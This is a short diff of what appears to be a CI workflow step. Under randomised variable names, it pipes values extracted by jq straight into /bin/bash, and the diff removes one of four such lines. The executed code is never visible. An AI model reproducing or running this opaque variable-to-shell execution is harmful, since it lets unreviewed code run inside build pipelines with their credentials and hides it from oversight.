@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$tcs53" | jq -r .z072 | /bin/bash
           printf '%s' "$fnf23058" | jq -r .aqsax5800 | /bin/bash
-          printf '%s' "$r079" | jq -r .dn00542 | /bin/bash
           echo $gtnh090 | jq -r .qqcns973 | /bin/bash
 
       - name: Save results
